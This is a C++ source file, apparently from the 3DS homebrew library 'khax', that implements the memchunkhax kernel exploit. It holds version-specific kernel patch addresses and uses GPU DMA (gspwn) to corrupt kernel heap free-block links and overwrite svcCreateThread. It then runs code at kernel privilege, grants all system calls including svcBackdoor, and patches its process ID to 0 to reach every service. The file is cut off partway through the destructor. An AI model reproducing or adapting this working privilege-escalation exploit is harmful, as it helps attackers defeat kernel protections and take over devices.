#include <3ds.h>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <limits>
#include <new>

#include "khax.h"
#include "khaxinternal.h"

//------------------------------------------------------------------------------------------------
namespace KHAX
{
	//------------------------------------------------------------------------------------------------
	// Kernel and hardware version information.
	struct VersionData
	{
		// New 3DS?
		bool m_new3DS;
		// Kernel version number
		u32 m_kernelVersion;
		// Nominal version number lower bound (for informational purposes only)
		u32 m_nominalVersion;
		// Patch location in svcCreateThread
		u32 m_threadPatchAddress;
		// Original version of code at m_threadPatchAddress
		static constexpr const u32 m_threadPatchOriginalCode = 0x8DD00CE5;
		// System call unlock patch location
		u32 m_syscallPatchAddress;
		// Kernel virtual address mapping of FCRAM
		u32 m_fcramVirtualAddress;
		// Physical mapping of FCRAM on this machine
		static constexpr const u32 m_fcramPhysicalAddress = 0x20000000;
		// Physical size of FCRAM on this machine
		u32 m_fcramSize;
		// Address of KThread address in kernel (KThread **)
		static constexpr KThread **const m_currentKThreadPtr = reinterpret_cast<KThread **>(0xFFFF9000);
		// Address of KProcess address in kernel (KProcess **)
		static constexpr void **const m_currentKProcessPtr = reinterpret_cast<void **>(0xFFFF9004);
		// Pseudo-handle of the current KProcess.
		static constexpr const Handle m_currentKProcessHandle = 0xFFFF8001;
		// Returned pointers within a KProcess object.  This abstracts out which particular
		// version of the KProcess object is in use.
		struct KProcessPointers
		{
			KSVCACL *m_svcAccessControl;
			u32 *m_kernelFlags;
			u32 *m_processID;
		};
		// Creates a KProcessPointers for this kernel version and pointer to the object.
		KProcessPointers(*m_makeKProcessPointers)(void *kprocess);

		// Convert a user-mode virtual address in the linear heap into a kernel-mode virtual
		// address using the version-specific information in this table entry.
		void *ConvertLinearUserVAToKernelVA(void *address) const;

		// Retrieve a VersionData for this kernel, or null if not recognized.
		static const VersionData *GetForCurrentSystem();

	private:
		// Implementation behind m_makeKProcessPointers.
		template <typename KProcessType>
		static KProcessPointers MakeKProcessPointers(void *kprocess);

		// Table of these.
		static const VersionData s_versionTable[];
	};

	//------------------------------------------------------------------------------------------------
	// ARM11 kernel hack class.
	class MemChunkHax
	{
	public:
		// Construct using the version information for the current system.
		MemChunkHax(const VersionData *versionData)
		:	m_versionData(versionData),
			m_nextStep(1),
			m_corrupted(0),
			m_overwriteMemory(nullptr),
			m_overwriteAllocated(0),
			m_extraLinear(nullptr)
		{
			s_instance = this;
		}

		// Free memory and such.
		~MemChunkHax();

		// Umm, don't copy this class.
		MemChunkHax(const MemChunkHax &) = delete;
		MemChunkHax &operator =(const MemChunkHax &) = delete;

		// Basic initialization.
		Result Step1_Initialize();
		// Allocate linear memory for the memchunkhax operation.
		Result Step2_AllocateMemory();
		// Free the second and fourth pages of the five.
		Result Step3_SurroundFree();
		// Verify that the freed heap blocks' data matches our expected layout.
		Result Step4_VerifyExpectedLayout();
		// Corrupt svcCreateThread in the ARM11 kernel and create the foothold.
		Result Step5_CorruptCreateThread();
		// Execute svcCreateThread to execute code at SVC privilege.
		Result Step6_ExecuteSVCCode();
		// Grant access to all services.
		Result Step7_GrantServiceAccess();

	private:
		// SVC-mode entry point thunk (true entry point).
		static Result Step6a_SVCEntryPointThunk();
		// SVC-mode entry point.
		Result Step6b_SVCEntryPoint();
		// Undo the code patch that Step5_CorruptCreateThread did.
		Result Step6c_UndoCreateThreadPatch();
		// Fix the heap corruption caused as a side effect of step 5.
		Result Step6d_FixHeapCorruption();
		// Grant our process access to all system calls, including svcBackdoor.
		Result Step6e_GrantSVCAccess();
		// Patch the process ID to 0.  Runs as svcBackdoor.
		static Result Step7a_PatchPID();
		// Restore the original PID.  Runs as svcBackdoor.
		static Result Step7b_UnpatchPID();

		// Helper for dumping memory to SD card.
		template <std::size_t S>
		bool DumpMemberToSDCard(const unsigned char (MemChunkHax::*member)[S], const char *filename) const;

		// Result returned by hacked svcCreateThread upon success.
		static constexpr const Result STEP6_SUCCESS_RESULT = 0x1337C0DE;

		// Version information.
		const VersionData *const m_versionData;
		// Next step number.
		int m_nextStep;
		// Whether we are in a corrupted state, meaning we cannot continue if an error occurs.
		int m_corrupted;

		// Free block structure in the kernel, the one used in the memchunkhax exploit.
		struct HeapFreeBlock
		{
			int m_count;
			HeapFreeBlock *m_next;
			HeapFreeBlock *m_prev;
			int m_unknown1;
			int m_unknown2;
		};

		// The layout of a memory page.
		union Page
		{
			unsigned char m_bytes[4096];
			HeapFreeBlock m_freeBlock;
		};

		// The linear memory allocated for the memchunkhax overwrite.
		struct OverwriteMemory
		{
			union
			{
				unsigned char m_bytes[6 * 4096];
				Page m_pages[6];
			};
		};
		OverwriteMemory *m_overwriteMemory;
		unsigned m_overwriteAllocated;

		// Additional linear memory buffer for temporary purposes.
		union ExtraLinearMemory
		{
			ALIGN(64) unsigned char m_bytes[64];
			// When interpreting as a HeapFreeBlock.
			HeapFreeBlock m_freeBlock;
		};
		// Must be a multiple of 16 for use with gspwn.
		static_assert(sizeof(ExtraLinearMemory) % 16 == 0, "ExtraLinearMemory isn't a multiple of 16 bytes");
		ExtraLinearMemory *m_extraLinear;

		// Copy of the old ACL
		KSVCACL m_oldACL;

		// Original process ID.
		u32 m_originalPID;

		// Buffers for dumped data when debugging.
	#ifdef KHAX_DEBUG_DUMP_DATA
		unsigned char m_savedKProcess[sizeof(KProcess_8_0_0_New)];
		unsigned char m_savedKThread[sizeof(KThread)];
		unsigned char m_savedThreadSVC[0x100];
	#endif

		// Pointer to our instance.
		static MemChunkHax *volatile s_instance;
	};

	//------------------------------------------------------------------------------------------------
	// Make an error code
	inline Result MakeError(Result level, Result summary, Result module, Result error);
	enum : Result { KHAX_MODULE = 254 };
	// Check whether this system is a New 3DS.
	Result IsNew3DS(bool *answer, u32 kernelVersionAlreadyKnown = 0);
	// gspwn, meant for reading from or writing to freed buffers.
	Result GSPwn(void *dest, const void *src, std::size_t size, bool wait = true);

	static Result userFlushDataCache(const void *p, std::size_t n);
	static Result userInvalidateDataCache(const void *p, std::size_t n);
	static void userFlushPrefetch();
	static void userDsb();
	static void userDmb();
	static void kernelCleanDataCacheLineWithMva(const void *p);
	static void kernelInvalidateInstructionCacheLineWithMva(const void *p);

	// Given a pointer to a structure that is a member of another structure,
	// return a pointer to the outer structure.  Inspired by Windows macro.
	template <typename Outer, typename Inner>
	Outer *ContainingRecord(Inner *member, Inner Outer::*field);
}


//------------------------------------------------------------------------------------------------
//
// Class VersionData
//

//------------------------------------------------------------------------------------------------
// Creates a KProcessPointers for this kernel version and pointer to the object.
template <typename KProcessType>
KHAX::VersionData::KProcessPointers KHAX::VersionData::MakeKProcessPointers(void *kprocess)
{
	KProcessType *kproc = static_cast<KProcessType *>(kprocess);

	KProcessPointers result;
	result.m_svcAccessControl = &kproc->m_svcAccessControl;
	result.m_processID = &kproc->m_processID;
	result.m_kernelFlags = &kproc->m_kernelFlags;
	return result;
}

//------------------------------------------------------------------------------------------------
// System version table
const KHAX::VersionData KHAX::VersionData::s_versionTable[] =
{
#define KPROC_FUNC(ver) MakeKProcessPointers<KProcess_##ver>

	// Old 3DS, old address layout
	{ false, SYSTEM_VERSION(2, 34, 0), SYSTEM_VERSION(4, 1, 0), 0xEFF83C9F, 0xEFF827CC, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
	{ false, SYSTEM_VERSION(2, 35, 6), SYSTEM_VERSION(5, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
	{ false, SYSTEM_VERSION(2, 36, 0), SYSTEM_VERSION(5, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
	{ false, SYSTEM_VERSION(2, 37, 0), SYSTEM_VERSION(6, 0, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
	{ false, SYSTEM_VERSION(2, 38, 0), SYSTEM_VERSION(6, 1, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
	{ false, SYSTEM_VERSION(2, 39, 4), SYSTEM_VERSION(7, 0, 0), 0xEFF83737, 0xEFF822A8, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
	{ false, SYSTEM_VERSION(2, 40, 0), SYSTEM_VERSION(7, 2, 0), 0xEFF83733, 0xEFF822A4, 0xF0000000, 0x08000000, KPROC_FUNC(1_0_0_Old) },
	// Old 3DS, new address layout
	{ false, SYSTEM_VERSION(2, 44, 6), SYSTEM_VERSION(8, 0, 0), 0xDFF8376F, 0xDFF82294, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
	{ false, SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF8383F, 0xDFF82290, 0xE0000000, 0x08000000, KPROC_FUNC(8_0_0_Old) },
	// New 3DS
	{ true,  SYSTEM_VERSION(2, 45, 5), SYSTEM_VERSION(8, 1, 0), 0xDFF83757, 0xDFF82264, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) }, // untested
	{ true,  SYSTEM_VERSION(2, 46, 0), SYSTEM_VERSION(9, 0, 0), 0xDFF83837, 0xDFF82260, 0xE0000000, 0x10000000, KPROC_FUNC(8_0_0_New) },

#undef KPROC_FUNC
};

//------------------------------------------------------------------------------------------------
// Convert a user-mode virtual address in the linear heap into a kernel-mode virtual
// address using the version-specific information in this table entry.
void *KHAX::VersionData::ConvertLinearUserVAToKernelVA(void *address) const
{
	static_assert((std::numeric_limits<std::uintptr_t>::max)() == (std::numeric_limits<u32>::max)(),
		"you're sure that this is a 3DS?");

	// Convert the address to a physical address, since that's how we know the mapping.
	u32 physical = osConvertVirtToPhys(address);
	if (physical == 0)
	{
		return nullptr;
	}

	// Verify that the address is within FCRAM.
	if ((physical < m_fcramPhysicalAddress) || (physical - m_fcramPhysicalAddress >= m_fcramSize))
	{
		return nullptr;
	}

	// Now we can convert.
	return reinterpret_cast<char *>(m_fcramVirtualAddress) + (physical - m_fcramPhysicalAddress);
}

//------------------------------------------------------------------------------------------------
// Retrieve a VersionData for this kernel, or null if not recognized.
const KHAX::VersionData *KHAX::VersionData::GetForCurrentSystem()
{
	// Get kernel version for comparison.
	u32 kernelVersion = osGetKernelVersion();

	// Determine whether this is a New 3DS.
	bool isNew3DS;
	if (IsNew3DS(&isNew3DS, kernelVersion) != 0)
	{
		return nullptr;
	}

	// Search our list for a match.
	for (const VersionData *entry = s_versionTable; entry < &s_versionTable[KHAX_lengthof(s_versionTable)]; ++entry)
	{
		// New 3DS flag must match.
		if ((entry->m_new3DS && !isNew3DS) || (!entry->m_new3DS && isNew3DS))
		{
			continue;
		}
		// Kernel version must match.
		if (entry->m_kernelVersion != kernelVersion)
		{
			continue;
		}

		return entry;
	}

	return nullptr;
}


//------------------------------------------------------------------------------------------------
//
// Class MemChunkHax
//

//------------------------------------------------------------------------------------------------
KHAX::MemChunkHax *volatile KHAX::MemChunkHax::s_instance = nullptr;

//------------------------------------------------------------------------------------------------
// Basic initialization.
Result KHAX::MemChunkHax::Step1_Initialize()
{
	if (m_nextStep != 1)
	{
		KHAX_printf("MemChunkHax: Invalid step number %d for Step1_Initialize\n", m_nextStep);
		return MakeError(28, 5, KHAX_MODULE, 1016);
	}

	// Nothing to do in current implementation.
	++m_nextStep;
	return 0;
}

//------------------------------------------------------------------------------------------------
// Allocate linear memory for the memchunkhax operation.
Result KHAX::MemChunkHax::Step2_AllocateMemory()
{
	if (m_nextStep != 2)
	{
		KHAX_printf("MemChunkHax: Invalid step number %d for Step2_AllocateMemory\n", m_nextStep);
		return MakeError(28, 5, KHAX_MODULE, 1016);
	}

	// Allocate the linear memory for the overwrite process.
	u32 address = 0xFFFFFFFF;
	Result result = svcControlMemory(&address, 0, 0, sizeof(OverwriteMemory), MEMOP_ALLOC_LINEAR,
		static_cast<MemPerm>(MEMPERM_READ | MEMPERM_WRITE));

	KHAX_printf("Step2:res=%08lx addr=%08lx\n", result, address);

	if (result != 0)
	{
		return result;
	}

	m_overwriteMemory = reinterpret_cast<OverwriteMemory *>(address);
	m_overwriteAllocated = (1u << 6) - 1;  // all 6 pages allocated now

	// Why didn't we get a page-aligned address?!
	if (address & 0xFFF)
	{
		// Since we already assigned m_overwriteMemory, it'll get freed by our destructor.
		KHAX_printf("Step2:misaligned memory\n");
		return MakeError(26, 7, KHAX_MODULE, 1009);
	}

	// Allocate extra memory that we'll need.
	m_extraLinear = static_cast<ExtraLinearMemory *>(linearMemAlign(sizeof(*m_extraLinear),
		alignof(*m_extraLinear)));
	if (!m_extraLinear)
	{
		KHAX_printf("Step2:failed extra alloc\n");
		return MakeError(26, 3, KHAX_MODULE, 1011);
	}
	KHAX_printf("Step2:extra=%p\n", m_extraLinear);

	// OK, we're good here.
	++m_nextStep;
	return 0;
}

//------------------------------------------------------------------------------------------------
// Free the second and fourth pages of the five.
Result KHAX::MemChunkHax::Step3_SurroundFree()
{
	if (m_nextStep != 3)
	{
		KHAX_printf("MemChunkHax: Invalid step number %d for Step3_AllocateMemory\n", m_nextStep);
		return MakeError(28, 5, KHAX_MODULE, 1016);
	}

	// We do this because the exploit involves triggering a heap coalesce.  We surround a heap
	// block (page) with two freed pages, then free the middle page.  By controlling both outside
	// pages, we know their addresses, and can fix up the corrupted heap afterward.
	//
	// Here's what the heap will look like after step 3:
	//
	// ___XX-X-X___
	//
	// _ = unknown (could be allocated and owned by other code)
	// X = allocated
	// - = allocated then freed by us
	//
	// In step 4, we will free the second page:
	//
	// ___X--X-X___
	//
	// Heap coalescing will trigger due to two adjacent free blocks existing.  The fifth page's
	// "previous" pointer will be set to point to the second page rather than the third.  We will
	// use gspwn to make that overwrite kernel code instead.
	//
	// We have 6 pages to ensure that we have surrounding allocated pages, giving us a little
	// sandbox to play in.  In particular, we can use this design to determine the address of the
	// next block--by controlling the location of the next block.
	u32 dummy;

	// Free the third page.
	if (Result result = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[2]), 0,
		sizeof(m_overwriteMemory->m_pages[2]), MEMOP_FREE, static_cast<MemPerm>(0)))
	{
		KHAX_printf("Step3:svcCM1 failed:%08lx\n", result);
		return result;
	}
	m_overwriteAllocated &= ~(1u << 2);

	// Free the fifth page.
	if (Result result = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[4]), 0,
		sizeof(m_overwriteMemory->m_pages[4]), MEMOP_FREE, static_cast<MemPerm>(0)))
	{
		KHAX_printf("Step3:svcCM2 failed:%08lx\n", result);
		return result;
	}
	m_overwriteAllocated &= ~(1u << 4);

	// Attempt to write to remaining pages.
	//KHAX_printf("Step2:probing page [0]\n");
	*static_cast<volatile u8 *>(&m_overwriteMemory->m_pages[0].m_bytes[0]) = 0;
	//KHAX_printf("Step2:probing page [1]\n");
	*static_cast<volatile u8 *>(&m_overwriteMemory->m_pages[1].m_bytes[0]) = 0;
	//KHAX_printf("Step2:probing page [3]\n");
	*static_cast<volatile u8 *>(&m_overwriteMemory->m_pages[3].m_bytes[0]) = 0;
	//KHAX_printf("Step2:probing page [5]\n");
	*static_cast<volatile u8 *>(&m_overwriteMemory->m_pages[5].m_bytes[0]) = 0;
	KHAX_printf("Step3:probing done\n");

	// Done.
	++m_nextStep;
	return 0;
}

//------------------------------------------------------------------------------------------------
// Verify that the freed heap blocks' data matches our expected layout.
Result KHAX::MemChunkHax::Step4_VerifyExpectedLayout()
{
	if (m_nextStep != 4)
	{
		KHAX_printf("MemChunkHax: Invalid step number %d for Step4_VerifyExpectedLayout\n", m_nextStep);
		return MakeError(28, 5, KHAX_MODULE, 1016);
	}

	// Copy the first freed page (third page) out to read its heap metadata.
	userInvalidateDataCache(m_extraLinear, sizeof(*m_extraLinear));
	userDmb();

	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[2],
		sizeof(*m_extraLinear)))
	{
		KHAX_printf("Step4:gspwn failed:%08lx\n", result);
		return result;
	}

	// Debug information about the memory block
	KHAX_printf("Step4:[2]u=%p k=%p\n", &m_overwriteMemory->m_pages[2], m_versionData->
		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[2]));
	KHAX_printf("Step4:[2]n=%p p=%p c=%d\n", m_extraLinear->m_freeBlock.m_next,
		m_extraLinear->m_freeBlock.m_prev, m_extraLinear->m_freeBlock.m_count);

	// The next page from the third should equal the fifth page.
	if (m_extraLinear->m_freeBlock.m_next != m_versionData->ConvertLinearUserVAToKernelVA(
		&m_overwriteMemory->m_pages[4]))
	{
		KHAX_printf("Step4:[2]->next != [4]\n");
		KHAX_printf("Step4:%p %p %p\n", m_extraLinear->m_freeBlock.m_next,
			m_versionData->ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[4]),
			&m_overwriteMemory->m_pages[4]);
		return MakeError(26, 5, KHAX_MODULE, 1014);
	}

	// Copy the second freed page (fifth page) out to read its heap metadata.
	userInvalidateDataCache(m_extraLinear, sizeof(*m_extraLinear));
	userDmb();

	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[4],
		sizeof(*m_extraLinear)))
	{
		KHAX_printf("Step4:gspwn failed:%08lx\n", result);
		return result;
	}

	KHAX_printf("Step4:[4]u=%p k=%p\n", &m_overwriteMemory->m_pages[4], m_versionData->
		ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[4]));
	KHAX_printf("Step4:[4]n=%p p=%p c=%d\n", m_extraLinear->m_freeBlock.m_next,
		m_extraLinear->m_freeBlock.m_prev, m_extraLinear->m_freeBlock.m_count);

	// The previous page from the fifth should equal the third page.
	if (m_extraLinear->m_freeBlock.m_prev != m_versionData->ConvertLinearUserVAToKernelVA(
		&m_overwriteMemory->m_pages[2]))
	{
		KHAX_printf("Step4:[4]->prev != [2]\n");
		KHAX_printf("Step4:%p %p %p\n", m_extraLinear->m_freeBlock.m_prev,
			m_versionData->ConvertLinearUserVAToKernelVA(&m_overwriteMemory->m_pages[2]),
			&m_overwriteMemory->m_pages[2]);
		return MakeError(26, 5, KHAX_MODULE, 1014);
	}

	// Validation successful
	++m_nextStep;
	return 0;
}

//------------------------------------------------------------------------------------------------
// Corrupt svcCreateThread in the ARM11 kernel and create the foothold.
Result KHAX::MemChunkHax::Step5_CorruptCreateThread()
{
	if (m_nextStep != 5)
	{
		KHAX_printf("MemChunkHax: Invalid step number %d for Step5_CorruptCreateThread\n", m_nextStep);
		return MakeError(28, 5, KHAX_MODULE, 1016);
	}

	userInvalidateDataCache(m_extraLinear, sizeof(*m_extraLinear));
	userDmb();

	// Read the memory page we're going to gspwn.
	if (Result result = GSPwn(m_extraLinear, &m_overwriteMemory->m_pages[2].m_freeBlock,
		sizeof(*m_extraLinear)))
	{
		KHAX_printf("Step5:gspwn read failed:%08lx\n", result);
		return result;
	}

	// Adjust the "next" pointer to point to within the svcCreateThread system call so as to
	// corrupt certain instructions.  The result will be that calling svcCreateThread will result
	// in executing our code.
	// NOTE: The overwrite is modifying the "m_prev" field, so we subtract the offset of m_prev.
	// That is, the overwrite adds this offset back in.
	m_extraLinear->m_freeBlock.m_next = reinterpret_cast<HeapFreeBlock *>(
		m_versionData->m_threadPatchAddress - offsetof(HeapFreeBlock, m_prev));

	userFlushDataCache(&m_extraLinear->m_freeBlock.m_next,
		sizeof(m_extraLinear->m_freeBlock.m_next));

	// Do the GSPwn, the actual exploit we've been waiting for.
	if (Result result = GSPwn(&m_overwriteMemory->m_pages[2].m_freeBlock, m_extraLinear,
		sizeof(*m_extraLinear)))
	{
		KHAX_printf("Step5:gspwn exploit failed:%08lx\n", result);
		return result;
	}

	// The heap is now corrupted in two ways (Step6 explains why two ways).
	m_corrupted += 2;

	KHAX_printf("Step5:gspwn succeeded; heap now corrupt\n");

	// Corrupt svcCreateThread by freeing the second page.  The kernel will coalesce the third
	// page into the second page, and in the process zap an instruction pair in svcCreateThread.
	u32 dummy;
	if (Result result = svcControlMemory(&dummy, reinterpret_cast<u32>(&m_overwriteMemory->m_pages[1]),
		0, sizeof(m_overwriteMemory->m_pages[1]), MEMOP_FREE, static_cast<MemPerm>(0)))
	{
		KHAX_printf("Step5:free to pwn failed:%08lx\n", result);
		return result;
	}
	m_overwriteAllocated &= ~(1u << 1);

	userFlushPrefetch();

	// We have an additional layer of instability because of the kernel code overwrite.
	++m_corrupted;

	KHAX_printf("Step5:svcCreateThread now hacked\n");

	++m_nextStep;
	return 0;
}

//------------------------------------------------------------------------------------------------
// Execute svcCreateThread to execute code at SVC privilege.
Result KHAX::MemChunkHax::Step6_ExecuteSVCCode()
{
	if (m_nextStep != 6)
	{
		KHAX_printf("MemChunkHax: Invalid step number %d for Step6_ExecuteSVCCode\n", m_nextStep);
		return MakeError(28, 5, KHAX_MODULE, 1016);
	}

	// Call svcCreateThread such that r0 is the desired exploit function.  Note that the
	// parameters to the usual system call thunk are rearranged relative to the actual system call
	// - the thread priority parameter is actually the one that goes into r0.  In addition, we
	// want to pass other parameters that make for an illegal thread creation request, because the
	// rest of the thread creation SVC occurs before the hacked code gets executed.  We want the
	// thread creation request to fail, then the hack to grant us control.  Processor ID
	// 0x7FFFFFFF seems to do the trick here.
	Handle dummyHandle;
	Result result = svcCreateThread(&dummyHandle, nullptr, 0, nullptr, reinterpret_cast<s32>(
		Step6a_SVCEntryPointThunk), (std::numeric_limits<s32>::max)());

	KHAX_printf("Step6:SVC mode returned: %08lX %d\n", result, m_nextStep);

	if (result != STEP6_SUCCESS_RESULT)
	{
		// If the result was 0, something actually went wrong.
		if (result == 0)
		{
			result = MakeError(27, 11, KHAX_MODULE, 1023);
		}

		return result;
	}

#ifdef KHAX_DEBUG
	char oldACLString[KHAX_lengthof(m_oldACL) * 2 + 1];
	char *sp = oldACLString;
	for (unsigned char b : m_oldACL)
	{
		*sp++ = "0123456789abcdef"[b >> 4];
		*sp++ = "0123456789abcdef"[b & 15];
	}
	*sp = '\0';

	KHAX_printf("oldACL:%s\n", oldACLString);
#endif

	++m_nextStep;
	return 0;
}

//------------------------------------------------------------------------------------------------
// SVC-mode entry point thunk (true entry point).
#ifndef _MSC_VER
__attribute__((__naked__))
#endif
Result KHAX::MemChunkHax::Step6a_SVCEntryPointThunk()
{
	__asm__ volatile("cpsid aif\n"
		"add sp, sp, #8\n");

	register Result result __asm__("r0") = s_instance->Step6b_SVCEntryPoint();

	__asm__ volatile("ldr pc, [sp], #4" : : "r"(result));
}

//------------------------------------------------------------------------------------------------
// SVC-mode entry point.
#ifndef _MSC_VER
__attribute__((__noinline__))
#endif
Result KHAX::MemChunkHax::Step6b_SVCEntryPoint()
{
	if (Result result = Step6c_UndoCreateThreadPatch())
	{
		return result;
	}
	if (Result result = Step6d_FixHeapCorruption())
	{
		return result;
	}
	if (Result result = Step6e_GrantSVCAccess())
	{
		return result;
	}

	return STEP6_SUCCESS_RESULT;
}

//------------------------------------------------------------------------------------------------
// Undo the code patch that Step5_CorruptCreateThread did.
Result KHAX::MemChunkHax::Step6c_UndoCreateThreadPatch()
{
	// Unpatch svcCreateThread.  NOTE: Misaligned pointer.
	*reinterpret_cast<u32 *>(m_versionData->m_threadPatchAddress) = m_versionData->
		m_threadPatchOriginalCode;

	kernelCleanDataCacheLineWithMva(
		reinterpret_cast<void *>(m_versionData->m_threadPatchAddress));
	userDsb();
	kernelInvalidateInstructionCacheLineWithMva(
		reinterpret_cast<void *>(m_versionData->m_threadPatchAddress));

	--m_corrupted;

	return 0;
}

//------------------------------------------------------------------------------------------------
// Fix the heap corruption caused as a side effect of step 5.
Result KHAX::MemChunkHax::Step6d_FixHeapCorruption()
{
	// The kernel's heap coalesce code seems to be like the following for the case we triggered,
	// where we're freeing a block before ("left") an adjacent block ("right"):
	//
	// (1)  left->m_count += right->m_count;
	// (2)  left->m_next = right->m_next;
	// (3)  right->m_next->m_prev = left;
	//
	// (1) should have happened normally.  (3) is what we exploit: we set right->m_next to point
	// to where we want to patch, such that the write to m_prev is the desired code overwrite.
	// (2) is copying the value we put into right->m_next to accomplish (3).
	//
	// As a result of these shenanigans, we have two fixes to do to the heap: fix left->m_next to
	// point to the correct next free block, and do the write to right->m_next->m_prev that didn't
	// happen because it instead was writing to kernel code.

	// "left" is the second overwrite page.
	auto left = static_cast<HeapFreeBlock *>(m_versionData->ConvertLinearUserVAToKernelVA(
		&m_overwriteMemory->m_pages[1].m_freeBlock));
	// "right->m_next" is the fifth overwrite page.
	auto rightNext = static_cast<HeapFreeBlock *>(m_versionData->ConvertLinearUserVAToKernelVA(
		&m_overwriteMemory->m_pages[4].m_freeBlock));

	// Do the two fixups.
	left->m_next = rightNext;
	--m_corrupted;

	rightNext->m_prev = left;
	--m_corrupted;

	return 0;
}

//------------------------------------------------------------------------------------------------
// Grant our process access to all system calls, including svcBackdoor.
Result KHAX::MemChunkHax::Step6e_GrantSVCAccess()
{
	// Everything, except nonexistent services 00, 7E or 7F.
	static constexpr const char s_fullAccessACL[] = "\xFE\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x3F";

	// Get the KThread pointer.  Its type doesn't vary, so far.
	KThread *kthread = *m_versionData->m_currentKThreadPtr;

	// Debug dumping.
#ifdef KHAX_DEBUG_DUMP_DATA
	// Get the KProcess pointer, whose type varies by kernel version.
	void *kprocess = *m_versionData->m_currentKProcessPtr;

	void *svcData = reinterpret_cast<void *>(reinterpret_cast<std::uintptr_t>(kthread->m_svcRegisterState) & ~std::uintptr_t(0xFF));
	std::memcpy(m_savedKProcess, kprocess, sizeof(m_savedKProcess));
	std::memcpy(m_savedKThread, kthread, sizeof(m_savedKThread));
	std::memcpy(m_savedThreadSVC, svcData, sizeof(m_savedThreadSVC));
#endif

	// Get a pointer to the SVC ACL within the SVC area for the thread.
	SVCThreadArea *svcThreadArea = ContainingRecord<SVCThreadArea>(kthread->m_svcRegisterState, &SVCThreadArea::m_svcRegisterState);
	KSVCACL &threadACL = svcThreadArea->m_svcAccessControl;

	// Save the old one for diagnostic purposes.
	std::memcpy(m_oldACL, threadACL, sizeof(threadACL));

	// Set the ACL for the current thread.
	std::memcpy(threadACL, s_fullAccessACL, sizeof(threadACL));

	return 0;
}

//------------------------------------------------------------------------------------------------
// Grant access to all services.
Result KHAX::MemChunkHax::Step7_GrantServiceAccess()
{
	// Backup the original PID.
	Result result = svcGetProcessId(&m_originalPID, m_versionData->m_currentKProcessHandle);
	if (result != 0)
	{
		KHAX_printf("Step7:GetPID1 fail:%08lx\n", result);
		return result;
	}

	KHAX_printf("Step7:current pid=%lu\n", m_originalPID);

	// Patch the PID to 0, granting access to all services.
	svcBackdoor(Step7a_PatchPID);

	// Check whether PID patching succeeded.
	u32 newPID;
	result = svcGetProcessId(&newPID, m_versionData->m_currentKProcessHandle);
	if (result != 0)
	{
		// Attempt patching back anyway, for stability reasons.
		svcBackdoor(Step7b_UnpatchPID);
		KHAX_printf("Step7:GetPID2 fail:%08lx\n", result);
		return result;
	}

	if (newPID != 0)
	{
		KHAX_printf("Step7:nonzero:%lu\n", newPID);
		return MakeError(27, 11, KHAX_MODULE, 1023);
	}

	// Reinit ctrulib's srv connection to gain access to all services.
	srvExit();
	srvInit();

	// Restore the original PID now that srv has been tricked into thinking that we're PID 0.
	svcBackdoor(Step7b_UnpatchPID);

	// Check whether PID restoring succeeded.
	result = svcGetProcessId(&newPID, m_versionData->m_currentKProcessHandle);
	if (result != 0)
	{
		KHAX_printf("Step7:GetPID3 fail:%08lx\n", result);
		return result;
	}

	if (newPID != m_originalPID)
	{
		KHAX_printf("Step7:not same:%lu\n", newPID);
		return MakeError(27, 11, KHAX_MODULE, 1023);
	}

	return 0;
}

//------------------------------------------------------------------------------------------------
// Patch the PID to 0.
Result KHAX::MemChunkHax::Step7a_PatchPID()
{
	// Disable interrupts ASAP.
	// FIXME: Need a better solution for this.
	__asm__ volatile("cpsid aif");

	// Patch the PID to 0.  The version data has a function pointer in m_makeKProcessPointers
	// to translate the raw KProcess pointer into pointers into key fields, and we access the
	// m_processID field from it.
	*(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr)
		.m_processID) = 0;
	return 0;
}

//------------------------------------------------------------------------------------------------
// Restore the original PID.
Result KHAX::MemChunkHax::Step7b_UnpatchPID()
{
	// Disable interrupts ASAP.
	// FIXME: Need a better solution for this.
	__asm__ volatile("cpsid aif");

	// Patch the PID back to the original value.
	*(s_instance->m_versionData->m_makeKProcessPointers(*s_instance->m_versionData->m_currentKProcessPtr)
		.m_processID) = s_instance->m_originalPID;
	return 0;
}

//------------------------------------------------------------------------------------------------
// Helper for dumping memory to SD card.
template <std::size_t S>
bool KHAX::MemChunkHax::DumpMemberToSDCard(const unsigned char(MemChunkHax::*member)[S], const char *filename) const
{
	char formatted[32];
	snprintf(formatted, KHAX_lengthof(formatted), filename,
		static_cast<unsigned>(m_versionData->m_kernelVersion), m_versionData->m_new3DS ?
		"New" : "Old");

	bool result = true;

	FILE *file = std::fopen(formatted, "wb");
	if (file)
	{
		result = result && (std::fwrite(this->*member, 1, sizeof(this->*member), file) == 1);
		std::fclose(file);
	}
	else
	{
		result = false;
	}

	return result;
}

//------------------------------------------------------------------------------------------------
// Free memory and such.
KHAX::MemChunkHax::~MemChunkHax()
{
	// Dump memory to SD card if that is enabled.
#ifdef KHAX_DEBUG_DUMP_DATA
	if (m_nextStep > 6)
	{
		DumpMemberToSDCard(&MemChunkHax::m_savedKProcess, "KProcess-%08X-%s.bin");
		DumpMemberToSDCard(&MemChunkHax::m_savedKThread, "KThread-%08X-%s.bin");
